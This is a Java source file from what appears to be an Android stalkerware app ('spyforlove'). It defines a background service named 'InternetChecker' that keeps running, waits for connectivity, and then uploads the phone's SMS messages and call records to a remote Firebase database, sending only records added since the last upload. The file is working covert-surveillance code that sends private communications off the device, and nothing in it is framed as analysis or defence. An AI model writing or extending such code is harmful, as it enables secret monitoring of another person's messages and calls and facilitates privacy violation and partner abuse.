package chem.kth.spyforlove.services;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;

import com.github.pwittchen.reactivenetwork.library.rx2.ReactiveNetwork;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.ValueEventListener;

import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;

import chem.kth.spyforlove.database.DatabaseHelper;
import chem.kth.spyforlove.database.FirebaseDatabaseHelper;
import chem.kth.spyforlove.database.SharePrefUtils;
import chem.kth.spyforlove.model.PhoneCallDateString;
import chem.kth.spyforlove.model.SMessage;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.schedulers.Schedulers;

public class InternetChecker extends Service {
    private static final String TAG = "log";
    private DatabaseReference phoneRef;
    private DatabaseReference smsRef;
    private static final DatabaseHelper dbHelper = DatabaseHelper.getInstance();
    private SharePrefUtils sharePrefUtils;

    public InternetChecker() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @SuppressLint("CheckResult")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        FirebaseDatabaseHelper db = FirebaseDatabaseHelper.getInstance();
        phoneRef = db.getPhoneCallRef();
        smsRef = db.getMessageRef();
        sharePrefUtils = SharePrefUtils.getInstance();
        // do something with isConnectedToInternet value
        ReactiveNetwork.observeInternetConnectivity()
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(this::showStatus, Throwable::printStackTrace);
        return START_STICKY;
    }

    private void showStatus(Boolean isConnectedToInternet) {
        if (isConnectedToInternet) {
            phCallUploadProcess();
            smsUploadProcess();
        }
    }

    private void smsUploadProcess() {
        String lastUploadedDate = sharePrefUtils.getSMSLastUploadedDate();
        List<SMessage> sMessageList;
        if (lastUploadedDate != null && !lastUploadedDate.isEmpty()) {
            sMessageList = dbHelper.getMessages(lastUploadedDate);
        } else {
            sMessageList = dbHelper.getMessages(null);
        }
        if (sMessageList != null && sMessageList.size() > 0) {
            Map<String, Object> smsMap = new HashMap<>();

            for (SMessage sMessage : sMessageList) {
                smsMap.put(sMessage.getDate(), sMessage);
            }
            Collections.sort(sMessageList, (o1, o2) -> o1.getDate().compareTo(o2.getDate()));
            Collections.reverse(sMessageList);

            DatabaseReference finalDbRef = smsRef.child(sMessageList.get(0).getDate());
            finalDbRef.setValue(smsMap);

            finalDbRef.addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                    if (dataSnapshot.exists()) {
                        sharePrefUtils.saveSMSLastUploadedDateTime(sMessageList.get(0).getDate());
                        for (DataSnapshot snapshot : dataSnapshot.getChildren()) {
                            Log.d(TAG, "onDataChange: " + snapshot.getKey());
                            Log.d(TAG, "onDataChange: " + Objects.requireNonNull(snapshot.getValue()).toString());
                        }
                    }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError error) {
                    // Failed to read value
                    Log.w(TAG, "Failed to read value.", error.toException());
                }
            });

        }
    }

    private void phCallUploadProcess() {
        String lastUploadedDate = sharePrefUtils.getCallLastUploadedDate();
        List<PhoneCallDateString> callList;
        if (lastUploadedDate != null && !lastUploadedDate.isEmpty()) {
            callList = dbHelper.getPhoneCalls(lastUploadedDate);
        } else {
            callList = dbHelper.getPhoneCalls(null);
        }
        if (callList != null && callList.size() > 0) {
            Map<String, Object> callListKeyMap = new HashMap<>();

            for (PhoneCallDateString pCall : callList) {
                callListKeyMap.put(pCall.getStart_date(), pCall);
            }

            Collections.sort(callList, (o1, o2) -> o1.getStart_date().compareTo(o2.getStart_date()));
            Collections.reverse(callList);

            DatabaseReference finalDbRef = phoneRef.child(callList.get(0).getStart_date());
            finalDbRef.setValue(callListKeyMap);

            finalDbRef.addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                    if (dataSnapshot.exists()) {
                        sharePrefUtils.saveCallLastUploadedDateTime(callList.get(0).getStart_date());
                        for (DataSnapshot snapshot : dataSnapshot.getChildren()) {
                            Log.d(TAG, "onDataChange: " + snapshot.getKey());
                            Log.d(TAG, "onDataChange: " + Objects.requireNonNull(snapshot.getValue()).toString());
                        }
                    }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError error) {
                    Log.w(TAG, "Failed to read value.", error.toException());
                }
            });

        }

    }
}